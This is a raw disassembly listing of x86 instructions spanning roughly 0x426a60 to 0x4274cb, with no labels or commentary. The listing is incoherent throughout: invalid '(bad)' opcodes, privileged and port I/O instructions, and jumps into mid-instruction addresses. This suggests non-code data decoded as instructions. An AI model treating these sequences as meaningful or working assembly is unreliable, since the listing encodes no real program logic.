  426a60:	int    0xda
  426a62:	pop    edi
  426a63:	icebp  
  426a64:	ja     0x426a97
  426a66:	push   ss
  426a67:	(bad)  
  426a68:	adc    cl,BYTE PTR [ebp-0x75]
  426a6b:	call   FWORD PTR [ecx+0x5d]
  426a6e:	test   DWORD PTR [eax],esp
  426a70:	adc    al,dl
  426a72:	jmp    0x426ac1
  426a74:	pop    es
  426a75:	cld    
  426a76:	or     al,0x99
  426a78:	mov    edi,DWORD PTR [ebp-0x39]
  426a7b:	retf   0x90ba
  426a7e:	iret   
  426a7f:	cmp    DWORD PTR [edx-0x7b],0xffffffff
  426a83:	pop    edi
  426a84:	sub    DWORD PTR ds:0x2efe10c0,edx
  426a8a:	dec    esp
  426a8b:	dec    ebp
  426a8c:	hlt    
  426a8d:	vaddss xmm3,xmm0,xmm1
  426a91:	jbe    0x426a88
  426a93:	and    DWORD PTR [edx-0x2408f92b],esi
  426a99:	fdivr  st(6),st
  426a9b:	jb     0x426a81
  426a9d:	xor    ebx,ebx
  426a9f:	xchg   esi,eax
  426aa0:	stos   DWORD PTR es:[edi],eax
  426aa1:	repz jne 0x426aac
  426aa4:	mov    ah,0x68
  426aa6:	push   0x74
  426aa8:	jge    0x426a9f
  426aaa:	repz jbe 0x426a68
  426aad:	leave  
  426aae:	je     0x426a3f
  426ab0:	leave  
  426ab1:	jne    0x426a70
  426ab3:	mov    dh,0xee
  426ab5:	shr    DWORD PTR [eax-0x47],0x6f
  426ab9:	xchg   DWORD PTR [eax-0x274f0bde],esi
  426abf:	pop    ss
  426ac0:	pushf  
  426ac1:	mov    esi,0x9ce55bf0
  426ac6:	push   eax
  426ac7:	push   cs
  426ac8:	mov    al,ds:0x9a00a41a
  426acd:	or     edi,ecx
  426acf:	dec    ebx
  426ad0:	or     eax,0x7f7e0924
  426ad5:	mov    ah,cl
  426ad7:	dec    eax
  426ad8:	ja     0x426aba
  426ada:	clc    
  426adb:	cs ss dec ecx
  426ade:	mov    bl,0x3b
  426ae0:	test   al,0xa
  426ae2:	jno    0x426adf
  426ae4:	and    DWORD PTR [edi-0x6e],eax
  426ae7:	int3   
  426ae8:	push   edx
  426ae9:	dec    esi
  426aea:	or     eax,0xb2731f
	...
  426b53:	add    BYTE PTR [eax],al
  426b55:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426b5b:	ja     0x426b38
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0x37
  426b63:	push   ss
  426b64:	mov    cl,0x44
  426b66:	addr16 lahf 
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	add    BYTE PTR [ecx],al
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	adc    al,0x87
  426b70:	jnp    0x426b74
  426b72:	jns    0x426ba5
  426b74:	pushf  
  426b75:	xchg   ebx,eax
  426b76:	ds cmp esp,edi
  426b79:	retf   
  426b7a:	gs call 0xab4e3bc4
  426b80:	idiv   DWORD PTR [esi-0x37]
  426b83:	(bad)  
  426b84:	(bad)
  426b88:	inc    esp
  426b89:	jp     0x426b49
  426b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b8d:	cmp    dl,bh
  426b8f:	or     eax,0x695a4495
  426b94:	sub    al,dh
  426b96:	xchg   ebp,eax
  426b97:	pmullw mm6,QWORD PTR [ecx+0x3f]
  426b9b:	inc    edi
  426b9c:	icebp  
  426b9d:	xchg   esp,eax
  426b9e:	inc    edx
  426b9f:	xchg   BYTE PTR [ebp+ecx*1+0x123e640f],dl
  426ba6:	pop    ss
  426ba7:	lds    eax,FWORD PTR [ebp+0x5]
  426baa:	add    al,0xee
  426bac:	ret    
  426bad:	or     al,BYTE PTR ds:0x2094f081
  426bb3:	add    edi,DWORD PTR [edx-0x748a5a6a]
  426bb9:	fadd   QWORD PTR [esi-0x35]
  426bbc:	iret   
  426bbd:	dec    esi
  426bbe:	aas    
  426bbf:	bndldx bnd3,[ecx-0x7]
  426bc3:	inc    edx
  426bc4:	(bad)  
  426bc5:	pop    esp
  426bc6:	loope  0x426c11
  426bc8:	gs das 
  426bca:	and    ch,0x4e
  426bcd:	adc    ch,cl
  426bcf:	ret    0x388a
  426bd2:	fmul   st,st(2)
  426bd4:	add    al,0x88
  426bd6:	jl     0x426ba3
  426bd8:	mov    ah,0x95
  426bda:	mov    edi,0xb51a3291
  426bdf:	sti    
  426be0:	xchg   esp,eax
  426be1:	xlat   BYTE PTR ds:[ebx]
  426be2:	mov    ch,0x90
  426be4:	mov    ah,0x83
  426be6:	test   eax,0x882eef66
  426beb:	sbb    al,0x7
  426bed:	clc    
  426bee:	lds    eax,FWORD PTR [ebx-0x423e576]
  426bf4:	jne    0x426bb4
  426bf6:	cli    
  426bf7:	mov    WORD PTR [edi-0x3458c438],?
  426bfd:	adc    DWORD PTR [edx-0x51],ebx
  426c00:	jne    0x426c25
  426c02:	cdq    
  426c03:	mov    ah,0xc0
  426c05:	and    ch,al
  426c07:	(bad)  
  426c08:	(bad)  [eax]
  426c0a:	or     dh,BYTE PTR [eax-0x20]
  426c0d:	std    
  426c0e:	cmp    esp,edx
  426c10:	mov    dh,0x55
  426c12:	xchg   edx,eax
  426c13:	xor    eax,0xabd6e0b0
  426c18:	xchg   DWORD PTR [esi-0x7c3fde8e],esp
  426c1e:	sahf   
  426c1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c20:	push   ss
  426c21:	push   es
  426c22:	in     eax,0x3e
  426c24:	icebp  
  426c25:	and    edi,ebx
  426c27:	(bad)  
  426c28:	ret    0xa66c
  426c2b:	or     BYTE PTR [esi-0x32d1e144],al
  426c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c32:	jmp    0x7863:0x9ba011e2
  426c39:	loop   0x426be1
  426c3b:	sbb    ecx,DWORD PTR [ebx+0x61394ba2]
  426c41:	inc    ebx
  426c42:	test   al,0xb8
  426c44:	dec    ebp
  426c45:	imul   ebx,ebp,0x6e16dc9d
  426c4b:	pop    es
  426c4c:	mov    eax,0x7e976673
  426c51:	arpl   WORD PTR [edx+ecx*8+0x1f],cx
  426c55:	div    BYTE PTR [esi]
  426c57:	inc    eax
  426c58:	sahf   
  426c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c5a:	mov    eax,0xa235b5e7
  426c5f:	in     al,dx
  426c60:	outs   dx,DWORD PTR ds:[esi]
  426c61:	jge    0x426c00
  426c63:	sub    BYTE PTR [edi],dl
  426c65:	mov    dl,0xe
  426c67:	mov    DWORD PTR [eax-0x732134d6],esp
  426c6d:	data16 add BYTE PTR [eax],al
	...
  426cd4:	add    BYTE PTR [eax],al
  426cd6:	loop   0x426d38
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0x72f05e39
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	pushf  
  426cef:	mov    eax,0xedb77fcc
  426cf4:	xor    eax,0xb274b767
  426cf9:	pop    ecx
  426cfa:	cmp    eax,0x7b85cf29
  426cff:	and    DWORD PTR [eax-0x3],0xffffffd8
  426d03:	fstp   DWORD PTR [ebx+0x45b90d10]
  426d09:	push   cs
  426d0a:	push   es
  426d0b:	sub    DWORD PTR [ecx+0x1d],esp
  426d0e:	sub    dl,al
  426d10:	add    esp,DWORD PTR [ebx+edi*2+0x44b53e66]
  426d17:	lock outs dx,DWORD PTR ds:[esi]
  426d19:	lods   al,BYTE PTR ds:[esi]
  426d1a:	inc    esi
  426d1b:	cdq    
  426d1c:	les    ebx,FWORD PTR ds:0x6edd8217
  426d22:	pop    esp
  426d23:	xlat   BYTE PTR ds:[ebx]
  426d24:	push   ebp
  426d25:	test   BYTE PTR [esi+0x6d3471c],cl
  426d2b:	mov    esi,0x118632bd
  426d30:	or     BYTE PTR [esi+eax*2+0x2d6dfc34],al
  426d37:	push   eax
  426d38:	mov    ds:0x1f91dd93,eax
  426d3d:	clc    
  426d3e:	mov    ch,BYTE PTR [ecx-0x7020b162]
  426d44:	out    dx,eax
  426d45:	int3   
  426d46:	stos   DWORD PTR es:[edi],eax
  426d47:	dec    eax
  426d48:	sub    bl,BYTE PTR [edx]
  426d4a:	jmp    0x426d65
  426d4c:	pop    ss
  426d4d:	lods   eax,DWORD PTR ds:[esi]
  426d4e:	iret   
  426d4f:	dec    esp
  426d50:	psubw  mm1,QWORD PTR [eax-0x2b2c1b84]
  426d57:	xchg   esi,eax
  426d58:	and    dl,BYTE PTR [edi-0x8]
  426d5b:	mov    BYTE PTR [ebp-0x658443c8],dh
  426d61:	xor    al,0xf6
  426d63:	stc    
  426d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d65:	pop    edi
  426d66:	(bad)  
  426d68:	int3   
  426d69:	mov    esp,0x121a3658
  426d6e:	cmp    dl,BYTE PTR [edx-0x1b]
  426d71:	std    
  426d72:	ins    DWORD PTR es:[edi],dx
  426d73:	adc    esi,DWORD PTR [edx-0x5285089f]
  426d79:	out    dx,al
  426d7a:	icebp  
  426d7b:	mov    eax,0x65d328d3
  426d80:	rcr    BYTE PTR [ecx+0xe],0x8
  426d84:	xchg   ebp,eax
  426d85:	rol    BYTE PTR [ebx-0x7b],1
  426d88:	outs   dx,BYTE PTR ds:[esi]
  426d89:	push   ecx
  426d8a:	fidivr WORD PTR [edi-0x36]
  426d8d:	cmp    ch,dh
  426d8f:	dec    edi
  426d90:	dec    esi
  426d91:	mov    al,ds:0xa0e392b1
  426d96:	pop    edi
  426d97:	jmp    0x426d20
  426d99:	ficomp WORD PTR [edx-0x6d]
  426d9d:	fld    TBYTE PTR [ebp+ecx*4-0x2f]
  426da1:	push   cs
  426da2:	(bad)  
  426da3:	aad    0x7c
  426da5:	mov    DWORD PTR [ecx],esi
  426da7:	sub    dl,bh
  426da9:	and    al,0x35
  426dab:	int3   
  426dac:	pushf  
  426dad:	enter  0xff47,0x3e
  426db1:	mov    edi,0x1c510bfc
  426db6:	js     0x426d9a
  426db8:	in     eax,dx
  426db9:	sub    eax,0x452d5b1f
  426dbe:	inc    ecx
  426dbf:	cmc    
  426dc0:	daa    
  426dc1:	popf   
  426dc2:	lea    ecx,ds:0xc53fd033
  426dc8:	(bad)  
  426dc9:	fistp  QWORD PTR [ecx-0x5e]
  426dcc:	stos   BYTE PTR es:[edi],al
  426dcd:	add    DWORD PTR [edx],0x1f1a214b
  426dd3:	or     bh,BYTE PTR [edi-0x3a67f46d]
  426dd9:	xchg   edx,eax
  426dda:	sbb    esp,esp
  426ddc:	addr16 sub al,0x73
  426ddf:	dec    ecx
  426de0:	sti    
  426de1:	test   esp,eax
  426de3:	rdtsc  
  426de5:	je     0x426d77
  426de7:	arpl   WORD PTR [ecx-0x31],si
  426dea:	cwde   
  426deb:	pushf  
  426dec:	rcl    dh,cl
	...
  426e56:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426e5c:	call   0x540c:0xc7c2ecf9
  426e63:	mov    edx,0xa1670306
  426e68:	add    DWORD PTR [eax],eax
  426e6a:	add    BYTE PTR [ecx],al
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	push   0xfffffffd
  426e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e71:	sub    DWORD PTR [ebp+0x5af87201],edx
  426e77:	jo     0x426e8f
  426e79:	mov    es,esi
  426e7b:	lahf   
  426e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e7d:	xor    ah,BYTE PTR [edx]
  426e7f:	lds    edi,FWORD PTR [ebp-0x32629dd2]
  426e85:	aas    
  426e86:	mov    ds:0x29255145,eax
  426e8b:	ret    
  426e8c:	loope  0x426e69
  426e8e:	dec    esi
  426e8f:	mov    edx,0x4602b6b7
  426e94:	jmp    0x426e6d
  426e96:	jmp    0x8e8e373b
  426e9b:	(bad)  
  426e9c:	mov    esp,0x7aaad80f
  426ea1:	cmp    eax,0x247e3f5d
  426ea6:	push   0xffffffd7
  426ea8:	xor    eax,0xf05d74ea
  426ead:	inc    ebx
  426eae:	pushf  
  426eaf:	lods   al,BYTE PTR ds:[esi]
  426eb0:	jmp    FWORD PTR [esi-0x21]
  426eb3:	call   0x683561a8
  426eb8:	or     BYTE PTR [ecx-0x4b9df7fe],al
  426ebe:	dec    BYTE PTR [esi]
  426ec0:	push   ecx
  426ec1:	sti    
  426ec2:	sub    bl,dl
  426ec4:	clc    
  426ec5:	stos   DWORD PTR es:[edi],eax
  426ec6:	fist   DWORD PTR [ebp+esi*4-0x54]
  426eca:	shl    esi,0x88
  426ecd:	mov    bl,0x5f
  426ecf:	push   ebx
  426ed0:	inc    ebx
  426ed1:	call   0x1dcb9137
  426ed6:	clc    
  426ed7:	xchg   ebp,eax
  426ed8:	lahf   
  426ed9:	push   0xe5c40bb5
  426ede:	loope  0x426ea2
  426ee0:	mov    edi,0x13217169
  426ee5:	jne    0x426f46
  426ee7:	push   ecx
  426ee8:	cmc    
  426ee9:	adc    al,0xc2
  426eeb:	push   ebx
  426eec:	ss mov ebp,0x9f5dd019
  426ef2:	mov    ds:0x4c9e8d95,eax
  426ef7:	sbb    bl,bh
  426ef9:	loop   0x426eec
  426efb:	or     ah,BYTE PTR [ebx+0x281449b7]
  426f01:	and    DWORD PTR [edi+0x30],0x2730818a
  426f08:	sub    DWORD PTR [ebx+0x220ab35a],esi
  426f0e:	icebp  
  426f0f:	cwde   
  426f10:	cs sbb al,0x0
  426f13:	aas    
  426f14:	cdq    
  426f15:	inc    edi
  426f16:	pop    eax
  426f17:	dec    ebp
  426f18:	outs   dx,BYTE PTR ds:[esi]
  426f19:	les    esp,FWORD PTR [eax]
  426f1b:	cmc    
  426f1c:	mov    ds:0xadc4c177,eax
  426f21:	dec    edi
  426f22:	cmc    
  426f23:	xchg   DWORD PTR [edx+0x6893526f],esi
  426f29:	test   al,0x46
  426f2b:	jp     0x426f6d
  426f2d:	mov    ah,bh
  426f2f:	(bad)  
  426f31:	xchg   edi,eax
  426f32:	loope  0x426f3a
  426f34:	add    esi,esp
  426f36:	stc    
  426f37:	mov    ebp,0x2f9ccb2
  426f3c:	or     BYTE PTR [ecx+esi*1+0x51],dl
  426f40:	iret   
  426f41:	xchg   esp,eax
  426f42:	mov    esi,DWORD PTR [eax-0x49]
  426f45:	nop
  426f46:	sub    edx,DWORD PTR [ecx]
  426f48:	loope  0x426ed1
  426f4a:	dec    ebx
  426f4b:	inc    ebx
  426f4c:	jl     0x426ee6
  426f4e:	js     0x426f61
  426f50:	or     eax,0x80ddf14a
  426f55:	inc    esi
  426f56:	leave  
  426f57:	cmp    ch,BYTE PTR [edx-0x52]
  426f5a:	sti    
  426f5b:	add    ch,BYTE PTR [eiz*1-0x4631eb5e]
  426f62:	fisubr WORD PTR ds:0x9fa79d5f
  426f68:	test   eax,0xa8c2eec
  426f6d:	or     BYTE PTR [eax],al
	...
  426fd3:	add    BYTE PTR [eax],al
  426fd5:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [eax+eiz*4+0x673fbdb3],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	retf   0x394
  426ff1:	inc    edx
  426ff2:	mov    dl,0x77
  426ff4:	(bad)  
  426ff6:	pop    ebx
  426ff7:	std    
  426ff8:	cs js  0x427029
  426ffb:	mov    BYTE PTR [ecx+0x37ce4309],dl
  427001:	or     al,0x1a
  427003:	add    eax,0xc68ddc87
  427008:	add    al,0x98
  42700a:	pusha  
  42700b:	adc    BYTE PTR [edi],al
  42700d:	xchg   esp,eax
  42700e:	and    eax,0xdadbb439
  427013:	xor    bl,BYTE PTR ds:0x367e6e60
  427019:	mov    ecx,0x8d37f5cb
  42701e:	or     eax,0xda5edc34
  427023:	or     al,0x84
  427025:	aam    0x18
  427027:	push   0x791dc91f
  42702c:	or     al,0x41
  42702e:	stc    
  42702f:	in     eax,dx
  427030:	add    DWORD PTR [edi],edx
  427032:	jne    0x427001
  427034:	retf   
  427035:	push   ecx
  427036:	mov    BYTE PTR [edi-0x7d],0x68
  42703a:	mov    ah,0xd7
  42703c:	mov    ebp,DWORD PTR [esi-0x6c3d494c]
  427042:	adc    DWORD PTR [esp+edx*1+0xe94f49b],esp
  427049:	jnp    0x427064
  42704b:	and    ebp,DWORD PTR [eax+0x14e9df27]
  427051:	retf   0xee47
  427054:	sbb    al,0xd2
  427056:	adc    al,0x4
  427058:	jne    0x42700c
  42705a:	rcr    ebp,1
  42705c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42705d:	je     0x426ff2
  42705f:	push   cs
  427060:	repnz adc eax,0x3810794c
  427066:	in     al,0x8a
  427068:	out    0xc1,eax
  42706a:	jge    0x4270aa
  42706c:	dec    ebx
  42706d:	int3   
  42706e:	leave  
  42706f:	jge    0x4270b6
  427071:	mov    BYTE PTR [esi-0x5b],0x70
  427075:	xchg   esp,eax
  427076:	mov    eax,0xc3b7c3c0
  42707b:	cmp    al,0x9d
  42707d:	test   BYTE PTR [esp+edi*1],ah
  427080:	pop    ds
  427081:	cmp    dl,dl
  427083:	cdq    
  427084:	adc    BYTE PTR ds:0xd7c66be7,0x6c
  42708b:	ins    BYTE PTR es:[edi],dx
  42708c:	push   es
  42708d:	push   esp
  42708e:	lock ror BYTE PTR [eax],1
  427091:	adc    DWORD PTR [edi],ecx
  427093:	sub    al,0xa7
  427095:	jp     0x4270db
  427097:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  427099:	mov    cl,0xef
  42709b:	pcmpeqd mm2,mm7
  42709e:	jns    0x42708a
  4270a0:	mov    ebx,DWORD PTR [ebp+eiz*8-0x1b]
  4270a4:	fild   QWORD PTR [esi-0x423a721]
  4270aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270ab:	jae    0x427108
  4270ad:	dec    ebp
  4270ae:	sub    ecx,DWORD PTR [eax]
  4270b0:	test   cl,0xc7
  4270b3:	and    al,BYTE PTR [eax]
  4270b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270b6:	fisubr WORD PTR [eax-0x4b]
  4270b9:	int3   
  4270ba:	dec    eax
  4270bb:	iret   
  4270bc:	idiv   DWORD PTR [edx]
  4270be:	mov    ah,0xe4
  4270c0:	jg     0x427131
  4270c2:	addr16 dec ecx
  4270c4:	jg     0x427082
  4270c6:	fstp   TBYTE PTR [esi+0x51]
  4270c9:	cld    
  4270ca:	in     eax,0xa9
  4270cc:	popf   
  4270cd:	imul   bx,sp,0x70
  4270d1:	jb     0x4270b0
  4270d3:	imul   esp,DWORD PTR [eax+0x7a],0x2f6ac3fd
  4270da:	sbb    al,BYTE PTR [ebx+0x40757e13]
  4270e0:	or     edx,edx
  4270e2:	dec    esi
  4270e3:	sub    DWORD PTR [ebp+0x9],ebx
  4270e6:	hlt    
  4270e7:	int    0x1d
  4270e9:	xchg   ecx,ebx
  4270eb:	mov    esi,0x7201
	...
  427154:	add    BYTE PTR [eax],al
  427156:	or     al,0x6d
  427158:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42715e:	inc    esp
  42715f:	mov    ebp,0xde2d9d96
  427164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427165:	aam    0x67
  427167:	mov    ds:0x1000001,eax
  42716c:	add    BYTE PTR [eax],al
  42716e:	outs   dx,DWORD PTR ds:[esi]
  42716f:	mov    ds:0x4b366290,eax
  427174:	push   esi
  427175:	inc    esi
  427176:	std    
  427177:	nop
  427178:	in     al,0x5a
  42717a:	mov    edi,0xf2409fe
  42717f:	sub    BYTE PTR [esi],ah
  427181:	fidiv  DWORD PTR [ecx-0x24d2695b]
  427187:	adc    BYTE PTR [ebx],ch
  427189:	outs   dx,DWORD PTR ds:[esi]
  42718a:	inc    ebp
  42718b:	in     al,dx
  42718c:	add    al,0x80
  42718e:	xor    ecx,edx
  427190:	push   edi
  427191:	sbb    ch,BYTE PTR [ebx-0x2d77b106]
  427197:	adc    al,0x8c
  427199:	sbb    DWORD PTR [edi],edi
  42719b:	pusha  
  42719c:	adc    eax,0x4e49be70
  4271a1:	push   ebp
  4271a2:	cmp    al,cl
  4271a4:	jo     0x42719d
  4271a6:	fwait
  4271a7:	jno    0x42715c
  4271a9:	push   esi
  4271aa:	cmp    esp,eax
  4271ac:	mov    edi,0x174e84c4
  4271b1:	test   al,0x16
  4271b3:	gs mov bl,0x0
  4271b6:	outs   dx,BYTE PTR ds:[esi]
  4271b7:	iret   
  4271b8:	and    BYTE PTR [ebx-0x5c],ah
  4271bb:	adc    ah,BYTE PTR [edx+ecx*1-0x5e]
  4271bf:	outs   dx,BYTE PTR ds:[esi]
  4271c0:	lahf   
  4271c1:	adc    edi,ebx
  4271c3:	(bad)  
  4271c4:	jmp    0x4271b7
  4271c6:	pop    es
  4271c7:	mov    dl,0xc9
  4271c9:	xor    BYTE PTR [edi+edi*4-0x682df60d],dl
  4271d0:	pop    ebp
  4271d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271d2:	and    cl,cl
  4271d4:	jecxz  0x4271b2
  4271d6:	test   al,0xa
  4271d8:	or     al,0xcb
  4271da:	sbb    eax,DWORD PTR [eax+0x2b]
  4271dd:	and    BYTE PTR [ecx+0x24],cl
  4271e0:	sub    al,0x46
  4271e2:	(bad)  
  4271e4:	jbe    0x4271ca
  4271e6:	pop    esi
  4271e7:	mov    ebx,0xf30826d3
  4271ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271ed:	pusha  
  4271ee:	mov    esp,0x620bcac
  4271f3:	nop
  4271f4:	jge    0x42721a
  4271f6:	std    
  4271f7:	inc    ebx
  4271f8:	std    
  4271f9:	push   ss
  4271fa:	push   edi
  4271fb:	outs   dx,BYTE PTR ds:[esi]
  4271fc:	das    
  4271fd:	push   eax
  4271fe:	mov    eax,0x3d5a2846
  427203:	cmp    eax,0xb7da4a74
  427208:	sti    
  427209:	sbb    BYTE PTR [ebx],bl
  42720b:	add    ch,BYTE PTR [eax-0x74]
  42720e:	dec    ebx
  42720f:	or     esp,esi
  427211:	add    DWORD PTR [ecx],ebp
  427213:	sbb    eax,0x705ab79
  427218:	push   ebx
  427219:	mov    esp,0x9e1b4096
  42721e:	repnz imul esp,ecx,0xe761ec4c
  427225:	cld    
  427226:	cmp    BYTE PTR [esi-0x3d671cc7],bh
  42722c:	and    DWORD PTR [eax-0x5a],ebx
  42722f:	in     al,dx
  427230:	fwait
  427231:	pop    esp
  427232:	pusha  
  427233:	(bad)  
  427234:	(bad)  [edi]
  427236:	cld    
  427237:	scas   al,BYTE PTR es:[edi]
  427238:	pop    esi
  427239:	or     eax,0x20e97d2c
  42723e:	test   eax,0xa864aa5
  427243:	pusha  
  427244:	adc    BYTE PTR [esp+ebx*8+0x3b8f82a7],ch
  42724b:	or     eax,0x34a946dd
  427250:	(bad)  
  427251:	ror    BYTE PTR [eax],cl
  427253:	push   esi
  427254:	and    al,0x7c
  427256:	sub    eax,0xd790cd3a
  42725b:	mov    edx,0x4bc666f9
  427260:	out    dx,eax
  427261:	jns    0x427240
  427263:	jecxz  0x427203
  427265:	jmp    0x427236
  427267:	int    0x6
  427269:	sti    
  42726a:	out    dx,eax
  42726b:	mov    ebx,0xb6e4
	...
  4272d4:	add    BYTE PTR [eax],al
  4272d6:	push   ds
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0xc11e20a1,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	(bad)  
  4272ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272f0:	sbb    BYTE PTR [edi+ebx*4],dl
  4272f3:	popa   
  4272f4:	jbe    0x4272af
  4272f6:	out    0x20,al
  4272f8:	call   0x3f028390
  4272fd:	xor    eax,0x83db8f62
  427302:	push   0x9bde7189
  427307:	pop    ss
  427308:	nop
  427309:	cmp    dl,BYTE PTR [ebx-0xb]
  42730c:	inc    edx
  42730d:	sbb    eax,0xbb8a7c51
  427312:	fisttp DWORD PTR [ecx+0x601df2b6]
  427318:	sub    al,0x9a
  42731a:	push   es
  42731b:	push   0xffffff93
  42731d:	pop    ebp
  42731e:	out    0xa9,al
  427320:	bound  esi,QWORD PTR [ebp-0x1cc4b3b9]
  427326:	aad    0xf4
  427328:	push   eax
  427329:	addr16 or al,0x50
  42732c:	in     al,dx
  42732d:	(bad)  [edx+0x69a7a5bd]
  427333:	dec    ebx
  427334:	push   ebx
  427335:	jb     0x4272bb
  427337:	push   ss
  427338:	imul   eax,DWORD PTR [ebp+0xb],0xffffffbc
  42733c:	es mov al,0x8d
  42733f:	and    ch,bh
  427341:	icebp  
  427342:	stos   BYTE PTR es:[edi],al
  427343:	mov    dh,0xc2
  427345:	jae    0x427371
  427347:	pop    edi
  427348:	(bad)  
  427349:	mov    ds:0xeca58c08,al
  42734e:	(bad)  
  42734f:	cmp    bl,BYTE PTR [edx-0x23]
  427352:	or     dl,BYTE PTR [ebp-0x2]
  427355:	iret   
  427356:	imul   BYTE PTR [eax]
  427358:	pop    ebp
  427359:	jae    0x42732c
  42735b:	pop    eax
  42735c:	adc    al,0xad
  42735e:	shr    BYTE PTR [esi-0x1e],0xbe
  427362:	push   eax
  427363:	mov    ah,0xd9
  427365:	test   eax,0x3d3ca223
  42736a:	adc    DWORD PTR [esi+0x18],0x71966490
  427371:	pop    esp
  427372:	mul    DWORD PTR [ebx+0x788ff8da]
  427378:	xor    dl,ch
  42737a:	rcr    DWORD PTR [esi+ecx*2],0x75
  42737e:	test   DWORD PTR [edx-0x2b1d1c00],esi
  427384:	mov    eax,ds:0xdea2ee88
  427389:	sbb    eax,0x92f2b75e
  42738e:	mov    ecx,0x498c964f
  427393:	cmp    eax,0x4db1f4a1
  427398:	fld    st(4)
  42739a:	xchg   ecx,eax
  42739b:	ja     0x4273d9
  42739d:	in     al,0xb7
  42739f:	int    0x1e
  4273a1:	sbb    bl,dh
  4273a3:	xchg   esp,eax
  4273a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273a5:	pop    ds
  4273a6:	sub    ah,al
  4273a8:	xchg   esp,eax
  4273a9:	ror    BYTE PTR [esi+0x24],1
  4273ac:	repnz mov ds:0x97c6a293,al
  4273b2:	in     eax,0xf2
  4273b4:	push   eax
  4273b5:	cs mov dl,0x1f
  4273b8:	dec    esi
  4273b9:	dec    eax
  4273ba:	call   0x89c6c0cf
  4273bf:	sub    edx,DWORD PTR [ebx]
  4273c1:	loop   0x4273ec
  4273c3:	ror    BYTE PTR [edx+0x1db9c5c1],1
  4273c9:	das    
  4273ca:	push   ss
  4273cb:	ins    BYTE PTR es:[edi],dx
  4273cc:	mov    al,ds:0xc7e4566b
  4273d1:	mov    ecx,0xed2fdb13
  4273d6:	test   DWORD PTR ds:0xde4cd1b4,esi
  4273dc:	mov    ds:0x12d2f615,al
  4273e1:	cmp    al,0xbf
  4273e3:	aam    0xb8
  4273e5:	jl     0x42739e
  4273e7:	retf   
  4273e8:	adc    al,0x2a
  4273ea:	call   0xda760a
	...
  427453:	add    BYTE PTR [eax],al
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    eax,DWORD PTR [edi+0x4e]
  427464:	dec    edi
  427465:	sbb    DWORD PTR [edi-0x5b],esp
  427468:	add    DWORD PTR [eax],eax
  42746a:	add    BYTE PTR [ecx],al
  42746c:	add    BYTE PTR [eax],al
  42746e:	mov    ds:0x37767f62,al
  427473:	ret    0xb8e
  427476:	add    BYTE PTR [esi+0x65],ah
  427479:	adc    edx,esp
  42747b:	gs push es
  42747d:	cwde   
  42747e:	es inc edi
  427480:	lea    ebp,[edx+0x38]
  427483:	bound  eax,QWORD PTR [ebx+edx*8]
  427486:	test   BYTE PTR [ebp+0x73],bh
  427489:	fwait
  42748a:	repnz cmp BYTE PTR [ecx],ch
  42748d:	test   edi,0x5eaa2dca
  427493:	cmc    
  427494:	scas   al,BYTE PTR es:[edi]
  427495:	ins    BYTE PTR es:[edi],dx
  427496:	fild   DWORD PTR [eax-0x75]
  427499:	mov    fs,ebx
  42749b:	in     eax,dx
  42749c:	add    al,0xce
  42749e:	pusha  
  42749f:	icebp  
  4274a0:	inc    ebp
  4274a1:	inc    edx
  4274a2:	push   0xbce18c6c
  4274a7:	xchg   ebx,eax
  4274a8:	push   ds
  4274a9:	mov    ebp,0x5feb44cd
  4274ae:	pop    ss
  4274af:	add    al,0x4c
  4274b1:	push   ebx
  4274b2:	lods   al,BYTE PTR ds:[esi]
  4274b3:	xchg   ecx,eax
  4274b4:	jno    0x42746c
  4274b6:	leave  
  4274b7:	dec    ebx
  4274b8:	push   ecx
  4274b9:	rol    BYTE PTR [esi],1
  4274bb:	int3   
  4274bc:	sahf   
  4274bd:	in     eax,dx
  4274be:	or     DWORD PTR [eax],0x22
  4274c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274c2:	xor    eax,0x2cf112df
  4274c7:	(bad)  
  4274c8:	mov    eax,DWORD PTR [eax+0x16]
  4274cb:	mov    ecx,0x419e6824
